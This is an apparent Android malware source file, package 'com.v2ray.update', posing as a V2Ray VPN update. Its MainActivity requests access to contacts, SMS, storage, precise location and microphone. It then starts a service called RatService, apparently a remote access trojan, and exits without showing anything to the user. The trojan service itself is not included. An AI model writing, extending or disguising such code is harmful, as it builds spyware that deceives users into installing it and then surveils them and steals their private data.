package com.v2ray.update;
import android.app.Activity; import android.content.Intent; import android.os.Bundle;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions(new String[]{android.Manifest.permission.READ_CONTACTS, android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.RECORD_AUDIO}, 100);
        startService(new Intent(this, RatService.class));
        finish();
    }
}